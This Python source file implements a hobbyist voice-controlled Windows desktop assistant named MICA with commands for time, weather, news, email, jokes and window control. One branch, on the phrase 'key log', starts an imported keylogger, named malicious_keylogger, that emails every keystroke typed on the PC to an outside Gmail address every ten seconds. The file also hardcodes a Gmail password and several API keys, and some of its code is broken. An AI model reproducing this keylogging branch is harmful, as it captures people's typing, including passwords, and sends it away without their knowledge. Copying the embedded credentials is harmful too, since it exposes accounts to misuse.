# text-to-speech conversion library in Python.
# Unlike alternative libraries, it works offline, 
# and is compatible with both Python 2 and 3
import pyttsx3

# install speech recognition
import speech_recognition as sr 


#Returns the list of recognized timezone names
import datetime

# time series modelling and analysis
from alpha_vantage.timeseries import TimeSeries

#Wikipedia is a Python library 
# that makes it easy to access and parse data from Wikipedia.
import wikipedia

#Secure SMTP subclasses for Python 2
import smtplib

#webbrowser is part of the python standard library
#it comes bundled with your python installation.
import webbrowser as wb

#This library contains Windows 
# / Hyper-V specific code commonly used in OpenStack projects
import os

#PyAutoGUI is a cross-platform GUI 
# automation Python module for 
# human beings. 
# Used to programmatically control the mouse & keyboard
import pyautogui

#cross-platform library for retrieving information on running processes and system utilization (CPU, memory, disks, network, sensors) 
import psutil

#One line jokes for programmers (jokes as a service)
import pyjokes

#backport of the subprocess standard library module 
import subprocess

#simple tool to generate fake data
import random

#functions for accessing special folders, 
# for using the shell’s file copy, rename & delete functionality
import winshell

#sed to access the underlying platform's data, 
# such as, hardware, operating system, and interpreter version information
import platform 

#A python wrapper for News API (newsapi.org)
from newsapi import NewsApiClient

#import file from the HackerManProfile folder
from Hack import HackerManProfile


from requests import get
#import file from the HackerManProfile folder
from Corona import coronaupdate

#access system-specific parameters and functions
import sys

#mplement high-level APIs for accessing many aspects of modern desktop and mobile systems.
from PyQt5 import QtGui
from PyQt5.QtCore import QTimer, QTime, QDate, Qt
from PyQt5.QtCore import *
from PyQt5.QtGui import *
from PyQt5.QtWidgets import *
from MicaUI import Ui_MICAUI 

#allows you to send HTTP requests 
# using Python. The HTTP request returns a 
# Response Object with all the response data
import requests

#pre-initialized string used as string constant
import string 


#output calendars like the 
# program and provides additional useful functions related to the calendar
import calendar



 

engine = pyttsx3.init()
rate = engine.getProperty('rate')
engine.setProperty('rate', 139)
voices = engine.getProperty('voices')
engine.setProperty('voice', voices[1].id)

api_key = 'WWHFCK0WYOQXSNZ3'
info = {} 
###############################################################methods#################################################################################
def speak(audio):
    engine.say(audio)
    engine.runAndWait()

def getvoices(voice):
    voices = engine.getProperty('voices')
    print(voices[1].id)
    if voice ==1:
        engine.setProperty('voice', voices[0].id)
        speak("hello this is mica. ")
        print("hello this is mica. ")

    if voice ==2:
        engine.setProperty('voice', voices[1].id)
        speak("hello this is mica. ")
        print("hello this is mica. ")

def takeCommand(self):
        r = sr.Recognizer()
        with sr.Microphone() as source:
            print("Listening....")
            r.pause_threshold = 0.6
            r.phrase_threshold = 0.290
            r.energy_threshold = 368
            audio = r.listen(source)
            
        try:
            print("Recongnizing....")
            self.query = r.recognize_google(audio, language='en-in')
            print(f"You said: {self.query}\n")

        except Exception as e:
            print(e)
            print("Exception: Sorry...I couldn't  recognize what u said " + str(e))
            (print('Say that again please ....'))
            speak('Could u please say that again ...')

            return "None"
        return self.query 

def openYoutube():
    wb.open('www.youtube.com')

def time():
    Time = datetime.datetime.now().strftime("%H:%M")
    speak("the current time is")
    speak(Time)
    print("the current time is " + Time)

def date():
    now = datetime.datetime.now()
    my_date =datetime.datetime.today()
    weekday = calendar.day_name[my_date.weekday()]
    monthNum = now.month
    dayNum = now.day

    MONTHS = ['January', 'February' , 'March' , 'April' , 'May' , 'June' ,
                   'July' , 'August' , 'September' , 'October' , 'November' ,'December']

    ordinalNumbers = ['1st' , '2nd' , '3rd' , '4th' , '5th ', '6th' , '7th' , '8th' , '9th' , '10th' , '11th',
                      '12th' , '13th' , '14th' , '15th' , '16th' , '17th' ,'18th' , '19th' , '20th' , '21st' ,
                      '22nd', '23rd' , '24th' , '25th' , '26th', '27th' , '28th' , '29th' , '30th' , '31st'
                     ]
    speak('Today is {} of {} {}'.format(ordinalNumbers[dayNum -1],MONTHS[monthNum -1],weekday))
    print('Today is {} of {} {}'.format(ordinalNumbers[dayNum -1],MONTHS[monthNum -1],weekday))
    
def newsinfo(self):
    newsapi = NewsApiClient(api_key='dcf7fb5c9e4c471ea65a65480149d945')
    speak(" what topic do you need the news about")
    topic = takeCommand(self)
    data = newsapi.get_top_headlines(q=topic, language='en', page_size=5)
    newsdata = data['articles']
    for x,y in enumerate(newsdata):
        print(f'{x}{y["description"]}')
        speak((f'{x}{y["description"]}'))
    
    speak("That's it for now, i'll update you later, sir")
    print("That's it for now, i'll update you later, sir")

def personal():
    speak(
        "I am MICA, Mack's Intelligent Companion Assistant, version 1.0. I am a Desktop Based AI Assistant created and developed by Mack harrison. I was created using Python with visual studio code. I am a virtual assistant A I made in python for the windows platforms. i have multiple" 
        + "functionalities such as telling the time, sending emails, retreiving current news reports, retrieving information through web scraping, machine learning and more. "
        + "My purpose is to provide human-like interactions with software and offer decision support for specific tasks."
    )
    speak("Now i hope you know me. i am here to offer any assistance")

    print(  "I am MICA, Mack's Intelligent Companion Assistant, version 1.0. I am a Desktop Based AI Assistant created and developed by Mack harrison. I was created using Python with visual studio code. I am a virtual assistant A I made in python for the windows platforms. i have multiple" 
        + "functionalities such as telling the time, sending emails, retreiving current news reports, retrieving information through web scraping, machine learning and more. "
        + "My purpose is to provide human-like interactions with software and offer decision support for specific tasks. Now i hope you know me. i am here to offer any assistance"
    )

def platDetails():
    
    platform_details = platform.platform() 
    info["platform details"] = platform_details 
    speak("the platform you are using is " + platform_details)
    print("the platform you are using is " + platform_details)

def system():
    
    system_name = platform.system() 
    info["system name"] = system_name 
    speak("the system you are using is " + system_name)
    print("the system you are using is " + system_name)

def architecture():
    architecture_details = platform.architecture()
    info["architectural detail"] = architecture_details 
    speak("the architecture of this pc is " )
    speak(architecture_details)
    print("the architecture of this pc is " )
    print(architecture_details)
    

def wishme():
    speak("Welcome Back, sir!.")
    hour = datetime.datetime.now().hour
    if hour >= 6 and hour <12:
        speak("Good morning, sir!.")
    elif hour>=12 and hour<18:
        speak("Good afternoon ,sir!. ")
    elif hour >= 18 and    hour < 24:
        speak("Good Evening, sir.")
    else:
        speak("Good night, sir") 

    speak("MICA online, Please tell me how can i help you?")

def sendEmail(to, content):
    server = smtplib.SMTP('smtp.gmail.com',587)
    server.ehlo()
    server.starttls()
    server.login('mcharrison500@gmail.com', 'garfield12345')
    server.sendmail('mcharrison500@gmail.com', to,content)
    server.close

def screenshot():
    img = pyautogui.screenshot()
    img.save("C:/Users/Mac/Pictures/M.I.C.A's screeshots/MICA_screenshot.jpg")

def passwordgenerate():
    s1 = string.ascii_uppercase
    s2 = string.ascii_lowercase
    s3 = string.digits
    s4 = string.punctuation

    passlength = 8
    s = []
    s.extend(list(s1))
    s.extend(list(s2))
    s.extend(list(s3))
    s.extend(list(s4))

    speak("one moment....")
    random.shuffle(s)
    newpassword = ("".join(s[0:passlength]))
    print(newpassword)
    speak("password has been generated")
    speak(newpassword)

def cpu():
    usage = str(psutil.cpu_percent())
    speak('cpu is at'+ usage)
    #battery = psutil.sensors_battery()
    #speak('Battery is at ')
    #speak(battery.percent )
  
def jokes():
    speak(pyjokes.get_joke())

def stockMarket():
    ts = TimeSeries(key=api_key, output_format='pandas')
    data = ts.get_intraday(symbol='MSFT', interval = '1min', outputsize = 'full')
    print(data)

    i = 1
    while i==1:
        data, meta_data = ts.get_intraday(symbol='MSFT', interval = '1min', outputsize = 'full')
        data.to_excel("output.xlsx")
        time.sleep(60)

    close_data = data['4. close']
    percentage_change = close_data.pct_change()

    print(percentage_change)

    last_change = percentage_change[-1]

    speak("The last change in microsoft stock is ")
    speak(last_change)

#############################################################Functions#########################################################################################  

class MainThread(QThread):
    def __init__(self):
        super(MainThread,self).__init__()

    def takeCommand(self):
        r = sr.Recognizer()
        with sr.Microphone() as source:
            print("Listening....")
            r.pause_threshold = 0.6
            r.phrase_threshold = 0.290
            r.energy_threshold = 368
            audio = r.listen(source)
            
        try:
            print("Recongnizing....")
            self.query = r.recognize_google(audio, language='en-in')
            print(f"You said: {self.query}\n")

        except Exception as e:
            print(e)
            print("Exception: Sorry...I couldn't  recognize what u said " + str(e))
            (print('Say that again please ....'))
            speak('Could u please say that again ...')

            return "None"
        return self.query 

    

    def run(self):
        self.TaskExecution()


    def TaskExecution(self):
        getvoices(2)
        wishme()
        while True:
            
            self.query = self.takeCommand().lower()

            if 'time' in self.query:
                time()
        
            elif 'date' in self.query:
                date()
        
            elif 'platform' in self.query:
                speak("one moment")
                platDetails()

            elif 'system' in self.query:
                system()
            
            elif 'architecture' in self.query:
                architecture() 

            elif 'wikipedia' in self.query:
                speak('Searching Wikipedia...')
                self.query = self.query.replace("wikipedia", "")
                results = wikipedia.summary(self.query, sentences = 2)
                speak("According to Wikipedia")
                print(results)
                speak(results)
                
            elif 'email me' in self.query:
                try:
                    speak("What should i say")   
                    content = self.takeCommand()
                    to = 'mcharrison500@gmail.com'
                    sendEmail(to,content) 
                    speak(content)
                    speak("Email has been sent")  
                except Exception as e:
                        print(e)
                        speak("Unable to send email")  
    
            elif 'send an email' in self.query:
                try:
                    speak("What should I say?")
                    content = self.takeCommand()
                    speak("whome should i send")
                    to = input()    
                    sendEmail(to, content)
                    speak("Email has been sent !")
                except Exception as e:
                    print(e)
                    speak("I am not able to send this email")

            elif 'market' in self.query or "microsoft" in self.query or "stock" in self.query:
                stockMarket()

            elif "yourself" in self.query or "who are you" in self.query or "about you" in self.query or "tell me about yourself" in self.query: 
                personal()

            elif 'search in chrome' in self.query:
                speak("What should i search ?")
                chromepath = 'C:/Program Files/Google/Chrome/Application/chrome.exe %s'
                search = self.takeCommand().lower()
                wb.get(chromepath).open_new_tab(search)

            elif 'open youtube' in self.query:
                speak('opening Youtube for you Sir')
                openYoutube()
            
            elif 'password' in self.query:
                passwordgenerate()

            elif 'open google' in self.query:
                speak("Here you go to Google\n")
                wb.open("google.com")

            elif 'open stack overflow' in self.query:
                speak("Here you go to Stack Over flow. Happy coding")
                wb.open("https://stackoverflow.com/") 

            elif 'empty the recycle bin' in self.query:
                try:
                    winshell.recycle_bin().empty(confirm = False, show_progress = False, sound = True)
                    speak("Recycle Bin Recycled")
                except Exception as e:
                    print(e)
                    speak("Bin is empty")

            elif 'tell me the weather' in self.query:
                url = 'http://api.openweathermap.org/data/2.5/weather?q=Galway,Ireland&APPID=e74a2d46b88cf270a4e9bffa671a9aad'
                res = requests.get(url)
                data = res.json()

                weather = data['weather'][0]['main']
                temp = data['main']['temp']
                description = data['weather'][0]['description']
                temp = round((temp - 32)* 5/9)
                print("one moment sir.....")
                print(weather)
                print(temp)
                print(description)
                speak("one moment sir......")
                speak('sir, im detecting that the temperature is: {} degree celcius'.format(temp))
                speak('the weather is {}'.format(description))

                print("one moment sir......")
                print('sir, im detecting that the temperature is: {} degree celcius'.format(temp))
                print('the weather is {}'.format(description))
                    
            elif 'logout' in self.query:
                os.system("shutdown -l")

            elif 'shutdown' in self.query:
                os.system("shutdown /s/ t 1")

            elif 'restart' in self.query:
                os.system("shutdown /r /t 1")

            elif 'remember ' in self.query:
                speak("What should I remember?")
                data = self.takeCommand()
                speak("you said to remember "+ data)
                remember = open('data.txt', 'w')
                remember.write(data)
                remember.close()
        
            elif 'coronavirus' in self.query or 'corona protocol' in self.query:
                coronaupdate.main()

            elif 'what did i say to remember' in self.query:
                try:
                    remember = open('data.txt', 'r')
                    speak("you said to remeber that" + remember.read())
                except:
                    speak("i have no recollection, sir")

            elif 'open spotify' in self.query:
                try:
                    codePath = "C:/Users/Mac/AppData/Roaming/Spotify/Spotify.exe"
                    os.startfile(codePath)
                except:
                    speak('spotify is already open')
                
            elif 'screenshot' in self.query:
                screenshot()
                speak("Done")

            elif 'cpu' in self.query:
                cpu()

            elif 'joke' in self.query or 'make me laugh' in self.query or 'know any jokes' in self.query:
                jokes()
                speak ("hahahaha")
                self.query = self.takeCommand()
                if 'not funny' in self.query or 'corny' in self.query or 'not your best' in self.query or 'that sucked' in self.query or 'wasnt funny'  in self.query:
                    speak("wow")
                    speak('yes it was sir, you just have no sense of humor') 

                elif 'that was funny' in self.query:
                    speak('thank you sir') or speak ('I know') or speak('i have quite the taste for humor') or speak('I am quite hilarious, sir')
            
            elif 'internet speed' in self.query:
                import speedtest
                speak("please be patient, this may take some time as i am gathering accurate information on your internet speed, sir")
                st = speedtest.Speedtest()
                dl = st.download()
                up = st.upload()

                speak(f"sir we have {dl}bit per second download speed and{up} bit per second uploading speed")
        
            elif 'key log' in self.query:
                speak("keylog activated, sir, every 10 seconds i will be sending the keys being typed from this PC to the email typed in")
                malicious_keylogger = HackerManProfile.KeyLogger(10, 'phantombreaksthrough@gmail.com', 'Garfield12345')
                malicious_keylogger.start()

            elif 'how are you' in self.query or 'how are you doing' in self.query:
                    speak("i am fine sir, what about you?")
                    self.query = self.takeCommand()
                    if 'im good' in self.query or 'am also good' in self.query or 'am also fine' in self.query or 'healthy' in self.query or 'fine' in self.query:
                        speak("wow")
                    if 'not fine' in self.query or 'not well' in self.query or 'not good' in self.query or 'felling low' in self.query or 'not in mood' in self.query:
                        speak("sad to hear that sir, how may I change your mood, May i play music for You?")
                        self.query = self.takeCommand()
                    if 'ok' in self.query or 'sure' in self.query or 'hmm' in self.query or 'alright' in self.query or 'yeah' in self.query or 'play music' in self.query  or 'yes' in self.query:
                        speak('ok sir. playing music for you')
                        music_dir = 'C:\\Users\\Mac\\Music\\The Seven Deadly Sins Original Soundtrack'
                        songs = os.listdir(music_dir)
                        rd = random.randint(0,17)
                        print(songs)
                        os.startfile(os.path.join(music_dir, songs[rd]))
                    elif "no" in self.query or "it's ok" in self.query or "don't play" in self.query or 'nope' in self.query:
                        speak("Ok sir, as You like!")

            elif 'open calculator'in self.query:
                speak("opening calculator")
                subprocess.Popen("C:\\Windows\\System32\\calc.exe")
            
            elif 'close'in self.query:
                speak("closing the window")
                pyautogui.hotkey('alt','f4')

            elif 'minimise the windows 'in self.query or'minimise the window'in self.query :
                speak("minimize the window")
                pyautogui.hotkey('Win','d')

            elif 'maximize the windows'in self.query or'maximize the window'in self.query :
                speak("maximizing windows, sir")
                pyautogui.hotkey('Win', 'd')

            elif 'new tab'in self.query:
                pyautogui.hotkey('ctrl','t')

            elif 'new file'in self.query:
                pyautogui.hotkey('ctrl','n')

            elif 'switch the windows'in self.query  or 'switch the tab'in self.query:
                pyautogui.hotkey('ctrl','shift','tab')

            elif 'volume up' in self.query:
                speak('volume up, sir')
                pyautogui.hotkey('volumeup')

            elif 'push'in self.query or 'play'in self.query:
                speak('ok')
                pyautogui.press('Space')

            elif "ip address" in self.query:
                ip = get('https://api.ipify.org').text
                speak(f"your IP address is {ip}")

            elif "news" in self.query:
                newsinfo(self)

            elif 'offline' in self.query:
                print("Do You want me to shutdown")
                speak("Do You want me to shutdown")
                self.query = self.takeCommand()
                if 'no' in self.query or 'cancel' in self.query:
                    speak("ok sir, cancelled request to shutdown")
                    print("ok sir, cancelled request to shutdown")
                if 'yes' in self.query or 'yep' in self.query or 'shutdown' in self.query:
                    hour = int(datetime.datetime.now().hour)
                    if hour>=0 and hour<18:
                        speak("Have a Nice day sir!")
                        print("Have a Nice day sir!")
                        sys.exit()
                    elif hour>=18 and hour<24:
                        speak("Ok, good Night sir")
                        print("Ok, good Night sir")
                        exit(app.exec_())
                        

startExecution = MainThread()

class Main(QMainWindow):
    def __init__(self):
        super().__init__()
        self.ui = Ui_MICAUI()
        self.ui.setupUi(self)
        self.ui.pushButton.clicked.connect(self.startTask)
        self.ui.pushButton_2.clicked.connect(self.close)

    def startTask(self):
        self.ui.movie = QtGui.QMovie("E:/5827f33f2327e8e2d74aa56d2e53465d.gif")
        self.ui.label.setMovie(self.ui.movie)
        self.ui.movie.start()
        self.ui.movie = QtGui.QMovie("E:/f889323d87ae92dbd5da3b1193708dc3.gif")
        self.ui.label_2.setMovie(self.ui.movie)
        self.ui.movie.start()
        self.ui.movie = QtGui.QMovie("E:/T8bahf.gif")
        self.ui.label_3.setMovie(self.ui.movie)
        self.ui.movie.start()
        self.ui.movie = QtGui.QMovie("E:/radiohalo-800.gif")
        self.ui.label_4.setMovie(self.ui.movie)
        self.ui.movie.start()
        timer = QTimer(self)
        timer.timeout.connect(self.showTime)
        timer.start(1000)
        startExecution.start()

    def showTime(self):
        current_time = QTime.currentTime()
        current_date = QDate.currentDate()
        label_time = current_time.toString('hh:mm:ss')
        label_date = current_date.toString(Qt.ISODate)
        self.TimeDisplay(label_time, label_date)

    def TimeDisplay(self, label_time, label_date):
        self.ui.textBrowser.setText(label_date)
        self.ui.textBrowser_2.setText(label_time)

  

app = QApplication(sys.argv)
MICA_ai = Main()
MICA_ai.show()
exit(app.exec_())
